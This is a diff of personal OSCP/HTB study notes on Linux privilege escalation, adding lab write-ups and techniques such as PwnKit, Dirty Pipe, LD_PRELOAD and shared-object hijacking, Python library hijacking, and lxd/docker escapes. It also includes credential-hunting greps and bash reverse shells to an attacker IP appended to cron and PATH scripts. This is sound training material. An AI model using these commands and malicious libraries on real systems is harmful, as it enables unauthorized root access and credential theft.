@@ -1,6 +1,6 @@
 # Module 18: Linux Privilege Escalation
 
-#LinuxPrivesc #PrivilegeEscalation #Module18 #OSCP #Linux #SUID #Capabilities #CronJob #KernelExploit #sudo #LinPEAS #GTFOBins
+#LinuxPrivesc #PrivilegeEscalation #Module18 #OSCP #Linux #SUID #Capabilities #CronJob #KernelExploit #sudo #LinPEAS #GTFOBins #PathAbuse #RestrictedShell #ContainerEscape #LDPreload #SharedObject #PythonHijack #Logrotate #NFS #docker #lxd
 
 Related: [[Windows Privilege Escalation]] | [[Password Attacks]] | [[Antivirus Evasion]]
 
@@ -148,6 +148,20 @@ find / -perm -u=s -type f 2>/dev/null
 ```
 SUID binaries run with the file owner's effective UID (usually root) regardless of who launches them. Anything non-standard here is suspicious. Cross-reference against GTFOBins immediately: https://gtfobins.github.io/
 
+**13. What SGID binaries exist?**
+```bash
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+```
+`-perm -6000` matches files with both SUID and SGID set. For SGID only: `-perm -g=s`. An SGID binary runs with the file's group GID rather than the launching user's GID. Check GTFOBins for anything non-standard.
+
+**14. Hunt for credentials embedded in shell scripts:**
+```bash
+find / -name "*.sh" 2>/dev/null | xargs grep -il "password\|secret\|db_pass" 2>/dev/null
+# Broad sweep across all script contents:
+find / -name "*.sh" 2>/dev/null | xargs cat 2>/dev/null | grep -i "password\|secret"
+```
+Internal scripts frequently have hardcoded credentials. In lab environments, flags are sometimes embedded here too: `xargs cat | grep "HTB\|OS{"` catches them fast.
+
 > 📸 Screenshot: SUID binary list output showing unusual or custom binary
 
 > 🔁 **Similar to:** the Windows PrivEsc situational awareness checklist in [[Windows Privilege Escalation#17.1.2 Situational Awareness|17.1.2 Situational Awareness]]. Same idea: build a picture before choosing an attack path.
@@ -232,6 +246,22 @@ Dotfiles (prepended with `.`) are hidden from basic `ls` but are readable. `.bas
 
 > 📸 Screenshot: `cat .bashrc` output showing `export SCRIPT_CREDENTIALS="lab"` line
 
+**Application config files:**
+
+Web app configs are a reliable credential source, especially on shared hosting or DevOps machines:
+```bash
+# WordPress database password
+cat /var/www/html/wp-config.php | grep "DB_PASSWORD"
+
+# Generic config file sweep
+find /var/www -name "*.conf" -o -name "*.config" -o -name "config.php" 2>/dev/null \
+  | xargs grep -i "password\|passwd\|secret" 2>/dev/null
+
+# .env files
+find / -name ".env" 2>/dev/null | xargs grep -i "password\|secret\|key" 2>/dev/null
+```
+Database credentials are often reused for system accounts. Always try them against `su`, SSH, and `sudo -s`.
+
 **Try the credential directly against root:**
 ```bash
 su - root
@@ -257,6 +287,9 @@ hydra -l eve -P wordlist 192.168.50.214 -t 4 ssh -V
 sudo -l
 ```
 `(ALL : ALL) ALL` means full sudo access. From there: `sudo -i` or `sudo su -` for root.
+
+> 🎬 **[ippsec.rocks: "hydra"](https://ippsec.rocks/?#hydra)** -- boxes using targeted brute-force with Hydra once a username is known
+> 🎬 **[ippsec.rocks: "dotfile"](https://ippsec.rocks/?#dotfile)** -- boxes where credential hunting in .bashrc / .bash_history reveals a password
 
 > 🔍 **Worth remembering generally:** a found credential with a recognisable pattern (prefix + variable suffix) is a signal to generate a targeted wordlist rather than throwing a generic rockyou at it. Crunch is ideal for this. The narrower the wordlist, the faster Hydra finishes.
 
@@ -299,6 +332,8 @@ sudo tcpdump -i lo -A | grep "pass"
 `-i lo` = loopback interface (catches traffic between local services), `-A` = print packet content as ASCII. Useful when local daemons communicate over unencrypted protocols.
 
 > 🔍 **Worth remembering generally:** `watch -n 1 "ps -aux | grep pass"` is a passive technique that costs nothing and occasionally hits gold in real environments. Run it early and let it sit in the background.
+
+> 🎬 **[ippsec.rocks: "tcpdump"](https://ippsec.rocks/?#tcpdump)** -- boxes where credential sniffing on loopback or internal interfaces reveals a password
 
 > 🔁 **Similar to:** Responder capturing Net-NTLMv2 hashes in [[Password Attacks|Module 16]]. Both are passive credential capture. Different protocol, same principle.
 
@@ -362,9 +397,24 @@ whoami
 
 > 🔁 **Similar to:** scheduled task binary replacement in [[Windows Privilege Escalation#17.3.1 Scheduled Tasks|17.3.1 Scheduled Tasks]]. On Windows you replace a binary; on Linux you modify the script directly if it is writable. Same core principle.
 
-> 🔍 **Worth remembering generally:** the `/var/log/syslog` CRON entries tell you the exact script path and timing, more reliably than reading `/etc/cron*` directories which might not reflect all active jobs.
+```mermaid
+flowchart TD
+    A["grep CRON /var/log/syslog\nor cat /var/log/cron.log"] --> B["Spot root-owned cron job\n(root) CMD /path/to/script.sh"]
+    B --> C["ls -lah /path/to/script.sh\ncat the script"]
+    C --> D{World-writable\nor group-writable?}
+    D -->|Yes| E["echo >> script.sh\nappend mkfifo reverse shell"]
+    D -->|No| F["Check PATH dirs called by cron\nCheck for writable parent dir"]
+    E --> G["nc -lnvp PORT on Kali\nwait one cron interval -- max 60s"]
+    G --> H["Root shell lands\nuid=0 gid=0"]
+    style H fill:#2e7d32,color:#fff
+    style D fill:#f57f17,color:#000
+```
+
+> 🔍 **Worth remembering generally:** the `/var/log/syslog` CRON entries tell you the exact script path and timing, more reliably than reading `/etc/cron*` directories which might not reflect all active jobs. On Debian/Kali containers without syslog, check `/var/log/cron.log` instead.
 
 > 🔗 **RevShells** for alternative one-liners: [revshells.com](https://www.revshells.com)
+
+> 🎬 **[ippsec.rocks: "cron"](https://ippsec.rocks/?#cron)** -- boxes where a writable cron job is the privesc path; cross-reference with "writable script"
 
 **Quiz answer (18.3.1):**
 - Log file holding cron job activity: **/var/log/syslog**
@@ -418,7 +468,19 @@ id
 
 > 🔍 **Worth remembering generally:** world-writable `/etc/passwd` is ancient but still turns up in environments where automation scripts set broad permissions for convenience. The unix-privesc-check tool flags it explicitly -- it is not subtle.
 
+```mermaid
+flowchart LR
+    A["root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash"] --> B["username:\nroot2"]
+    A --> C["password hash:\nFdzt.eqJQ4s0g\n(openssl passwd w00t)"]
+    A --> D["UID:GID:\n0:0 = root"]
+    A --> E["comment:\nroot"]
+    A --> F["home dir:\n/root"]
+    A --> G["shell:\n/bin/bash"]
+```
+
 > 🔁 **Similar to:** password hash concepts in [[Password Attacks|Module 16]]. You are not cracking anything here; you are injecting a hash you already know the plaintext for.
+
+> 🎬 **[ippsec.rocks: "etc passwd"](https://ippsec.rocks/?#etc%20passwd)** -- boxes exploiting world-writable /etc/passwd or /etc/shadow misconfigurations
 
 **Quiz answer (18.3.2):**
 - Hashing algorithm used by default with `openssl passwd`: **crypt** (DES-based Unix crypt algorithm)
@@ -524,7 +586,32 @@ uid=0(root) gid=1000(joe) groups=...
 
 > 🔗 **GTFOBins** for capabilities: [gtfobins.github.io](https://gtfobins.github.io/) -- filter by "Capabilities".
 
+**cap_dac_override -- bypass file read/write permissions:**
+
+`cap_dac_override` lets the binary ignore DAC (Discretionary Access Control) checks entirely: it can read and write any file on the system, permissions notwithstanding. The HTB example: `vim.basic = cap_dac_override+eip`.
+
+```bash
+find /usr/bin/ /usr/sbin/ /usr/local/bin/ /usr/local/sbin/ -type f -exec getcap {} \;
+# /usr/bin/vim.basic = cap_dac_override+eip
+```
+
+Exploit: open `/etc/passwd` in vim, delete the `x` from root's password field to clear it, save, then `su root` with no password:
+
+```bash
+/usr/bin/vim.basic /etc/passwd
+# Find:  root:x:0:0:root:/root:/bin/bash
+# Edit:  root::0:0:root:/root:/bin/bash    (remove the x)
+# :wq to save
+
+su root
+# No password -- shadow entry bypassed
+cat /root/flag.txt
+```
+
 > 🔍 **Worth remembering generally:** capabilities and SUID are different mechanisms but the search pattern is identical: find a binary with elevated rights, look it up on GTFOBins, run the payload. `getcap -r /` for capabilities; `find / -perm -u=s -type f` for SUID.
+
+> 🎬 **[ippsec.rocks: "suid"](https://ippsec.rocks/?#suid)** -- boxes where a non-standard SUID binary is the privesc vector
+> 🎬 **[ippsec.rocks: "capabilities"](https://ippsec.rocks/?#capabilities)** -- boxes exploiting Linux capability misconfigurations
 
 **Quiz answers (18.4.1):**
 - Utility to manually search for misconfigured capabilities: **`getcap`** (full path: `/usr/sbin/getcap`)
@@ -586,6 +673,35 @@ sudo apt-get changelog apt
 > 🔗 **GTFOBins** for sudo: [gtfobins.github.io](https://gtfobins.github.io/) -- filter by "Sudo". Covers apt, vim, nano, find, python, perl, git, man, less, more, and dozens more.
 
 > 🔍 **Worth remembering generally:** always look up every allowed sudo binary on GTFOBins, even ones that seem harmless. `less`, `more`, `man`, `git`, `nano`, `vim` -- all have shell escape techniques.
+
+> 🎬 **[ippsec.rocks: "sudo"](https://ippsec.rocks/?#sudo)** -- boxes where sudo misconfiguration is the privesc vector; search "gtfobins" there too
+
+**sudo -u#-1 bypass -- CVE-2019-14287 (sudo < 1.8.28):**
+
+On sudo versions below 1.8.28, specifying user ID `-1` (or its unsigned equivalent `4294967295`) is interpreted as UID 0 (root) by the underlying `setresuid()` call. This bypasses explicit `(ALL, !root)` sudoers entries that are meant to block running as root.
+
+```bash
+sudo -l
+# User may run: (ALL, !root) /bin/ncdu
+
+sudo --version
+# Sudo version 1.8.25p1   <-- vulnerable
+
+sudo -u#-1 /bin/ncdu
+# Drops into ncdu as UID 0, despite the !root restriction
+```
+
+Inside ncdu, press `b` to spawn a shell in the current directory:
+```
+b          # spawns /bin/sh as root
+cat /root/flag.txt
+```
+
+> 🔍 **Worth remembering generally:** `(ALL, !root)` in sudoers looks like it blocks root escalation. On vulnerable sudo versions it does not. Always check `sudo --version` when you see `!root` entries -- anything below 1.8.28 is exploitable with `-u#-1`.
+
+> 🔗 **GTFOBins -- ncdu:** [gtfobins.github.io/gtfobins/ncdu/](https://gtfobins.github.io/gtfobins/ncdu/)
+
+> 🔗 **GTFOBins -- busctl (another pager-escape tool):** `sudo busctl --show-machine` opens a `less`-style pager; `!/bin/sh` drops a root shell. Same pattern as apt-get changelog.
 
 > 🔁 **Similar to:** UAC token filtering and service start rights in [[Windows Privilege Escalation#17.2.3 Unquoted Service Paths|17.2.3 Unquoted Service Paths]]. Permission boundaries are sometimes tighter than they appear; you have to find where the actual hole is, not just the surface permission.
 
@@ -652,11 +768,40 @@ uid=0(root) gid=0(root) groups=0(root),1001(joe)
 
 > 📸 Screenshot: kernel exploit output showing "credentials patched, launching shell..." then `id` confirming uid=0
 
+> 🎬 **[ippsec.rocks: "kernel exploit"](https://ippsec.rocks/?#kernel%20exploit)** -- boxes where kernel CVEs are the privesc path; "dirty cow" and "dirty pipe" are common search terms on that page
+
 > 🔍 **Worth remembering generally:** kernel exploits that spawn an interactive shell sometimes need a real TTY to work properly. If you are on a netcat shell and the exploit seems to hang, stabilise the shell first with `python3 -c 'import pty; pty.spawn("/bin/bash")'` and set terminal size before running. Alternatively try via SSH.
 
 > 🔁 **Similar to:** the Windows kernel exploit workflow in [[Windows Privilege Escalation#17.3.2 Using Exploits|17.3.2 Using Exploits]]. Same pattern: enumerate system info, match to CVE/exploit, transfer, compile, run. The key lesson there about needing RDP for interactive shell applies here too.
 
 > 🔗 **searchsploit (Exploit-DB):** [exploit-db.com/searchsploit](https://www.exploit-db.com/searchsploit)
+
+**Dirty Pipe -- CVE-2022-0847 (kernel 5.8 to 5.17):**
+
+A pipe buffer flag bug lets an unprivileged user overwrite read-only file content by splicing data into a pipe. In practice the exploit temporarily patches `/etc/passwd` to clear the root password, giving instant `su root`, then restores the file -- no persistent changes.
+
+```bash
+uname -r
+# 5.15.0-051500-generic   <-- vulnerable (5.8-5.17)
+
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+scp -r CVE-2022-0847-DirtyPipe-Exploits/ user@<TARGET>:~/
+
+# On target:
+cd CVE-2022-0847-DirtyPipe-Exploits/
+bash compile.sh
+./exploit-1
+# Backing up /etc/passwd to /tmp/passwd.bak ...
+# Setting root password to "piped"...
+# Restoring /etc/passwd from /tmp/passwd.bak...
+# Done! Popping shell...
+
+cat /root/flag.txt
+```
+
+`exploit-1` patches and restores. `exploit-2` sets SUID on `/bin/bash` and gives a persistent SUID shell (`/bin/bash -p`) even after the exploit exits.
+
+> 🎬 **[ippsec.rocks: "dirty pipe"](https://ippsec.rocks/?#dirty%20pipe)** -- boxes exploiting CVE-2022-0847
 
 **Quiz answer (18.4.3):**
 - Compiler used to build the exploit binary: **gcc**
@@ -668,19 +813,562 @@ uid=0(root) gid=0(root) groups=0(root),1001(joe)
 - Output: `[*] credentials patched, launching shell...` → uid=0(root)
 - Quiz answer: `gcc` (no OS{} flag on VM#1)
 
-> 🚩 Hands-on, VM spin-up required: 18.4.3 VM#2 (Capstone). Get root by abusing a different vulnerability from those covered in the module. ⬜ Pending
+**18.4.3 VM#2 -- COMPLETE**
+- Ubuntu 16.04.4, kernel 4.4.0-116-generic, x86_64 (same as VM#1)
+- SUID binary hunt: `find / -perm -u=s -type f 2>/dev/null`
+- Checked versions: `pkexec --version` → 0.105; `snap --version` → snapd 2.29.4.2; `ntfs-3g --version` → 2015.3.14AR.1
+- Tried dirty_sock (CVE-2019-7304) for snapd 2.29.4.2 via `searchsploit snapd` → 46362.py. Exploit reported "Success" both runs but install hook silently failed to create the dirty_sock user (confirmed via `grep dirty_sock /etc/passwd` returning nothing). Likely snap confinement or timing issue in this lab environment.
+- Pivoted to pkexec 0.105: CVE-2021-4034 (PwnKit) -- not in searchsploit default db, cloned from GitHub: `git clone https://github.com/berdav/CVE-2021-4034.git`
+- Pre-compiled on Kali linked against glibc 2.34 which Ubuntu 16.04 doesn't have. Transferred source files with `scp -r`, compiled natively on target with `gcc -Wall --shared -fPIC -o pwnkit.so pwnkit.c && gcc -Wall cve-2021-4034.c -o cve-2021-4034-local`
+- Ran `./cve-2021-4034-local` → immediate root shell, uid=0(root)
+- Flag: `cat /root/flag.txt` → **OS{afdd54c4978e0e34014e82e75cf4284f}**
 
-> 🚩 Hands-on, VM spin-up required: 18.4.3 VM#3 (Capstone). Use an appropriate privesc technique to get root and read the flag. ⬜ Pending
+> 📸 Screenshot: `find / -perm -u=s -type f 2>/dev/null` output showing pkexec, snap-confine, ntfs-3g
+> 📸 Screenshot: `./cve-2021-4034-local` → root shell and flag
 
-> 🚩 Hands-on, VM spin-up required: 18.4.3 VM#4 (Capstone). Privesc via file permissions. Take a closer look at what is writable. ⬜ Pending
+> 🔍 Worth remembering generally: always compile exploits natively on the target if the pre-built binary throws a glibc version mismatch. The source is already on disk after scp -- just run gcc there.
 
-> 🚩 Hands-on, VM spin-up required: 18.4.3 VM#5 (Capstone). Privesc via binary flags and custom shell. Think SUID or capabilities. ⬜ Pending
+> 🔁 Similar to: [[Linux Privilege Escalation#18.4.3 Exploiting Kernel Vulnerabilities|18.4.3 VM#1]] -- same "compile on target" pattern, different CVE.
+
+**18.4.3 VM#3 -- COMPLETE**
+- Kali Linux container, student/lab via SSH port 2222 (192.168.236.52)
+- No /var/log/syslog, no journald -- checked /var/log/ directly: found `cron.log`
+- `cat /var/log/cron.log` → "running the archiver" every minute
+- `find / -name "*archiv*" 2>/dev/null` → `/var/archives/archive.sh` and `/etc/cron.hourly/archiver`
+- `ls -lah /var/archives/archive.sh` → `-rwxrwxrwx` (world-writable)
+- `/etc/cron.hourly/archiver` calls `archive.sh`; comment says it was also added to personal crontab to run every minute
+- Injected reverse shell: `echo 'bash -i >& /dev/tcp/192.168.45.223/4444 0>&1' >> /var/archives/archive.sh`
+- Shell landed on nc listener within 60 seconds as root
+- Flag: `cat /root/flag.txt` → **OS{c5fb9839877a429f39607f59e58d4733}**
+
+> 📸 Screenshot: `ls -lah /var/archives/archive.sh` showing -rwxrwxrwx
+> 📸 Screenshot: nc listener receiving root shell and flag
+
+> 🔍 Worth remembering generally: when /var/log/syslog doesn't exist, check /var/log/cron.log directly. Container environments often skip syslog/journald but cron still writes its own log file.
+
+**18.4.3 VM#4 -- COMPLETE**
+- Kali Linux container, student/lab via SSH port 2222 (192.168.236.52)
+- `find / -writable -type f 2>/dev/null | grep -v proc` → `/etc/passwd` world-writable
+- `openssl passwd w00t` → `RDpuQgpRTx0ks`
+- `echo 'root2:RDpuQgpRTx0ks:0:0:root:/root:/bin/bash' >> /etc/passwd`
+- `su root2` with password `w00t` → root shell
+- Flag: `cat /root/flag.txt` → **OS{4768b2c127c0c5a3f26728237e8c5e77}**
+
+> 📸 Screenshot: `find / -writable -type f` output showing /etc/passwd
+> 📸 Screenshot: `su root2` → root shell prompt and flag
+
+**18.4.3 VM#5 -- COMPLETE**
+- Ubuntu container, student/lab via SSH port 2222 (192.168.236.52)
+- `find / -perm -u=s -type f 2>/dev/null` → non-standard SUID binaries: `/usr/bin/find`, `/usr/bin/gawk`, `/usr/bin/vim.basic`
+- Used `find` GTFOBins SUID entry: `find . -exec /bin/sh -p \; -quit`
+- `-p` flag on `/bin/sh` preserves the effective UID (root); shell spawns as euid=0
+- `id` → uid=1000(student) gid=1000(student) **euid=0(root)**
+- Flag: `cat /root/flag.txt` → **OS{a5f462ceb1f60973d7824b84299a2829}**
+
+> 📸 Screenshot: `find / -perm -u=s -type f 2>/dev/null` showing find, gawk, vim.basic
+> 📸 Screenshot: `find . -exec /bin/sh -p \; -quit` → euid=0 shell and flag
+
+> 🔍 Worth remembering generally: when multiple non-standard SUID binaries are present, `find` is the fastest GTFOBins exploit (one-liner, no interactive shell required). Check gawk and vim as backups.
+> 🔁 Similar to: [[Linux Privilege Escalation#18.4.1 Abusing Setuid Binaries and Capabilities|18.4.1 VM#1+VM#2]] -- same SUID search, different binary.
 
 #### Tags: #KernelExploit #searchsploit #gcc #CVE #Module18
 
 ---
 
-## 18.5 Wrapping Up
+---
+
+## 18.5 HTB Supplementary Techniques
+
+> 🔖 *These sections cover techniques from the HTB Linux Privilege Escalation module that have no direct equivalent in the Offsec Module 18 content. All tested against HTB Academy VMs.*
+
+---
+
+### 18.5.1 Path Abuse
+
+When your PATH contains a non-standard writable directory (like `/tmp`), you can plant a malicious binary with the same name as a command a root-owned script calls without a full path, and it gets executed instead of the real one.
+
+**Check your PATH:**
+```bash
+echo $PATH
+# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/tmp
+```
+Any writable directory in the list is a candidate. `/tmp` appearing here is the classic red flag. Compare against the standard Debian/Ubuntu PATH; anything extra is worth probing.
+
+**The attack:**
+1. A root-owned cron script or SUID binary calls something like `backup` (no full path)
+2. PATH is searched left to right; if your writable dir comes before `/usr/bin`, your binary runs first
+3. Plant a reverse shell named after the expected command
+
+```bash
+echo '#!/bin/bash' > /tmp/backup
+echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' >> /tmp/backup
+chmod +x /tmp/backup
+# nc -nvlp 4444 on Kali, then wait for the cron interval
+```
+
+> 🔍 **Worth remembering generally:** PATH abuse is easy to miss because you are looking at an environment variable, not a file. Always `echo $PATH` in the first 60 seconds on a new shell.
+
+> 🔁 **Similar to:** DLL hijacking on Windows [[Windows Privilege Escalation#17.2.2 DLL Hijacking|17.2.2 DLL Hijacking]]. Same search-order abuse, different platform.
+
+#### Tags: #PathAbuse #PrivEsc #Module18
+
+---
+
+### 18.5.2 Escaping Restricted Shells
+
+Restricted shells (usually `rbash`) block: `cd`, setting PATH, output redirection, commands with `/`. Spotting one: the shell prompt may say `rbash`, or `cd /tmp` returns "bash: cd: restricted".
+
+**Method 1 -- SSH with bash --noprofile:**
+```bash
+ssh htb-user@<TARGET> -t "bash --noprofile"
+# Press Ctrl+C to dismiss the startup script if it interrupts
+# You now have an unrestricted bash
+ls
+cat flag.txt
+```
+`-t` forces a pseudo-TTY allocation. `bash --noprofile` skips the startup file that enforces the restriction. This is the fastest bypass when you have SSH credentials.
+
+**Method 2 -- Editor shell escape:**
+```
+vi                   # if vi is available
+:set shell=/bin/bash
+:shell               # drops you into unrestricted bash
+```
+In nano: `Ctrl+R` then `Ctrl+X` then `reset; bash 1>&0 2>&0`
+
+**Method 3 -- Available scripting language:**
+```bash
+python3 -c 'import os; os.execv("/bin/bash", ["/bin/bash"])'
+perl -e 'exec "/bin/bash"'
+awk 'BEGIN {system("/bin/bash")}'
+```
+
+**Method 4 -- Copy bash to an allowed dir:**
+```bash
+cp /bin/bash /home/user/bin/bash
+/home/user/bin/bash --noprofile
+```
+
+> 📸 Screenshot: `ssh user@target -t "bash --noprofile"` then Ctrl+C then unrestricted bash prompt running `cat flag.txt`
+
+> 🔗 **VK9 Security -- Linux Restricted Shell Bypass:** [vk9-sec.com/linux-restricted-shell-bypass/](https://vk9-sec.com/linux-restricted-shell-bypass/)
+> 🔗 **HackTricks -- Bypass Bash Restrictions (GitHub):** [github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/useful-linux-commands/bypass-bash-restrictions.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/useful-linux-commands/bypass-bash-restrictions.md)
+
+#### Tags: #RestrictedShell #rbash #ShellEscape #Module18
+
+---
+
+### 18.5.3 Privileged Groups
+
+Some groups grant near-root access without appearing in sudo. Always check `id` early.
+
+| Group | What it grants |
+|-------|----------------|
+| `lxd` | Init/exec privileged containers: effectively full root on the host |
+| `docker` | Mount host filesystem into containers: effectively root |
+| `adm` | Read all files under `/var/log/` |
+| `disk` | Raw block device access via `debugfs` |
+| `shadow` | Read `/etc/shadow`, crack hashes offline |
+
+**adm group: credential and flag hunting in /var/log/:**
+```bash
+id
+# groups=...,4(adm)
+
+grep -rw "password\|flag\|secret" /var/log 2>/dev/null
+```
+Apache access logs sometimes hold credentials in URL query strings. URL-decode any `%20` (space), `%3D` (=), etc. to read the value:
+```
+# /var/log/apache2/access.log:
+# GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps! HTTP/1.1
+# flag = ch3ck_th0se_gr0uP_m3mb3erSh1Ps!
+```
+
+> 📸 Screenshot: `grep -rw "flag" /var/log` returning an Apache access log line with the credential in the URL
+
+---
+
+**lxd group: container escape:**
+
+```bash
+# 1. Import an Alpine image (pre-staged or pulled)
+lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine-container
+lxc image list    # verify
+
+# 2. Init a privileged container, mount host / to /mnt/root inside it
+lxc init alpine-container privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+
+# 3. Start and exec into the container
+lxc start privesc
+lxc exec privesc /bin/sh
+
+# 4. Full host root access through the mount
+cat /mnt/root/root/flag.txt
+```
+
+`security.privileged=true` disables user namespace isolation, so uid=0 inside the container maps to uid=0 on the host. The disk device mount exposes the entire host filesystem with those root permissions.
+
+> 📸 Screenshot: `lxc exec privesc /bin/sh` shell prompt, then `cat /mnt/root/root/flag.txt`
+
+> 🔗 **HackTricks -- LXD Privilege Escalation (GitHub):** [github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.md)
+
+---
+
+**docker group: container escape:**
+
+Docker daemon runs as root. Any user in the `docker` group can mount the host filesystem into a container and chroot into it.
+
+```bash
+id
+# groups=...,118(docker)
+
+docker image ls     # find an available image
+
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+# root@<container_id>:/# id
+# uid=0(root) gid=0(root)
+
+cat /root/flag.txt
+```
+
+Command breakdown:
+- `-H unix:///var/run/docker.sock` -- connect to Docker daemon via socket
+- `run -v /:/mnt` -- mount host root at /mnt inside the container
+- `--rm` -- auto-remove container on exit
+- `chroot /mnt bash` -- pivot root to the host filesystem and start bash
+
+> 📸 Screenshot: `docker image ls`, then the run command, then `whoami` and `cat /root/flag.txt`
+
+> 🔗 **GTFOBins -- docker:** [gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)
+
+> 🔍 **Worth remembering generally:** `lxd` and `docker` group membership is just as dangerous as being in `sudo`. They get overlooked because the word "sudo" isn't there. `id` at the start of every engagement, every time.
+
+#### Tags: #PrivilegedGroups #lxd #docker #adm #ContainerEscape #Module18
+
+---
+
+### 18.5.4 Shared Libraries and LD_PRELOAD
+
+When `sudo -l` shows `env_keep+=LD_PRELOAD`, sudo preserves that variable into root context. `LD_PRELOAD` tells the dynamic linker to load a custom shared library before any other, including before the allowed binary initialises. Your `_init()` function runs as root.
+
+**1. Spot it:**
+```bash
+sudo -l
+# Matching Defaults entries:
+#     env_keep+=LD_PRELOAD
+# User may run: (root) NOPASSWD: /usr/bin/openssl
+```
+
+**2. Write the malicious shared library (`root.c`):**
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");  // prevent infinite loop on child processes
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+**3. Compile it:**
+```bash
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+```
+- `-fPIC` -- position independent code, required for shared objects
+- `-shared` -- produce a .so rather than an executable
+- `-nostartfiles` -- don't link standard C startup; `_init` is our custom entry point
+
+**4. Load it via the allowed sudo command:**
+```bash
+sudo LD_PRELOAD=./root.so /usr/bin/openssl
+# root@NIX02:~# id
+# uid=0(root) gid=0(root)
+```
+
+> 📸 Screenshot: `sudo -l` showing env_keep+=LD_PRELOAD, then compiling root.so, then the sudo command spawning a root shell
+
+> 🔍 **Worth remembering generally:** `env_keep+=LD_PRELOAD` is a well-known misconfiguration and a classic exam find. It only matters when the variable is preserved into a privileged context. A plain `LD_PRELOAD` as a normal user does nothing special.
+
+> 🔁 **Similar to:** [[Linux Privilege Escalation#18.5.5 Shared Object Hijacking|18.5.5 Shared Object Hijacking]] -- both abuse the dynamic linker. LD_PRELOAD is blunter (loads before everything else); object hijacking is more targeted (replaces a specific missing .so in the search path).
+
+#### Tags: #SharedLibraries #LDPreload #sudo #Module18
+
+---
+
+### 18.5.5 Shared Object Hijacking
+
+Some SUID binaries load shared libraries from a custom RPATH directory hardcoded at compile time. If that directory is writable, plant a malicious .so with matching function names and the binary loads your code with its elevated UID.
+
+**1. Find SUID binaries and check library dependencies:**
+```bash
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+# Check what .so files the binary expects
+ldd /home/htb-student/shared_obj_hijack/payroll
+# linux-vdso.so.1 => ...
+# libcustom.so => not found    <-- missing library: our target
+# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
+```
+
+**2. Find the RPATH (the hardcoded search directory):**
+```bash
+readelf -d /home/htb-student/shared_obj_hijack/payroll | grep PATH
+# 0x000000000000001d (RUNPATH) Library runpath: [/development]
+```
+
+**3. Check if the RPATH directory is writable:**
+```bash
+ls -la /development
+# drwxrwxrwx 2 root root 4096 ...   <-- world-writable
+```
+
+**4. Write a malicious library with the expected function name:**
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void dbquery() {
+    printf("Malicious library loaded!\n");
+    setuid(0);
+    system("/bin/sh -p");
+}
+```
+The function name must match what the binary calls. Identify it with `strings /path/to/binary` or `objdump -d`.
+
+**5. Compile into the RPATH directory:**
+```bash
+gcc -shared -fPIC -nostartfiles -o /development/libcustom.so evil.c
+```
+
+**6. Run the SUID binary:**
+```bash
+/home/htb-student/shared_obj_hijack/payroll
+# Malicious library loaded!
+# $ id
+# uid=0(root)
+```
+
+> 📸 Screenshot: `ldd` showing "not found" for libcustom.so, `readelf -d` showing RUNPATH, then running the binary and getting a root shell
+
+> 🔍 **Worth remembering generally:** `ldd --version` tells you the glibc version. If a pre-compiled exploit or .so throws a "version GLIBC_X.XX not found" error, recompile natively on the target. Same lesson as kernel exploits.
+
+> 🔗 **HackTricks -- Shared Library Hijacking (GitHub):** [github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/privilege-escalation/ld.so.conf-example.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/privilege-escalation/ld.so.conf-example.md)
+
+#### Tags: #SharedObjectHijacking #ldd #readelf #RPATH #Module18
+
+---
+
+### 18.5.6 Python Library Hijacking
+
+When a Python script runs with elevated privileges (sudo, cron as root) and imports a library you can control, you can inject your code into that library to run as root. Three methods, in order of how common they appear in labs.
+
+**Method 1: Modify a writable library file (most common)**
+
+Find which file defines the function being imported, then check permissions:
+```bash
+grep -r "def virtual_memory" /usr/
+# /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
+
+ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
+# -rw-r--r-- 1 htb-student staff 87657 ...   <-- we own it (or group-writable)
+```
+
+Edit the function to inject code before the original logic:
+```python
+def virtual_memory():
+    import os
+    os.system('cat /root/flag.txt')   # or reverse shell one-liner
+    # ... rest of original function continues ...
+```
+
+Trigger it:
+```bash
+sudo /usr/bin/python3 /home/htb-student/mem_status.py
+# HTB{3xpl0i7iNG_Py7h0n_lI8R4ry_HIjiNX}
+# Available memory: 87.34%
+```
+
+**Method 2: Shadow the library with a local module**
+
+Python checks the script's directory before the system library paths. If the working directory is writable, create a file named after the imported library there:
+```bash
+echo 'import os; os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")' \
+  > /home/htb-student/psutil.py
+
+sudo /usr/bin/python3 /home/htb-student/mem_status.py
+/tmp/bash -p    # -p preserves effective UID
+```
+
+**Method 3: PYTHONPATH manipulation**
+
+If sudoers has `env_keep+=PYTHONPATH`, plant your module in a controlled dir:
+```bash
+sudo -l | grep PYTHONPATH
+
+echo 'import os; os.system("/bin/bash")' > /tmp/psutil.py
+sudo PYTHONPATH=/tmp /usr/bin/python3 /path/to/script.py
+```
+
+> 📸 Screenshot: `ls -l` on the library file showing ownership, then the modified function, then `sudo python3 script.py` printing the flag
+
